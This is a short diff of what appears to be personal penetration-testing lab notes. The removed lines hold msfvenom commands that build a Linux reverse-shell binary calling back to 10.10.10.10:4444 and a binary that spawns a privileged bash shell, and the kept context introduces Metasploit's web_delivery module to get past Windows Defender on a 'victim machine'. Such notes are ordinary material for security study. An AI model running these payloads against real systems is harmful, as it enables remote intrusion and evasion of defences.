@@ -1,19 +1,4 @@
-# Notes
-
-Other
-
-* https://www.hackerrank.com/
-* The [SecLists GitHub Repository](https://github.com/danielmiessler/SecLists/) contains useful lists of usernames/passwords, payloads, urls, ...
-
-<hr class="sep-both">
-
-## Metasploit
-
-msfvenom to generate a reverse shell ELF binary: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf`
-
-generate a payload using msfvenom callnig /bin/bash:
-
-msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+# Metasploit
 
 Since we know our victim machine is running Windows Defender, let's go ahead and try a different method of payload delivery! For this, we'll be using the script web delivery exploit within Metasploit. Launch Metasploit now and select 'exploit/multi/script/web_delivery' for use.
 
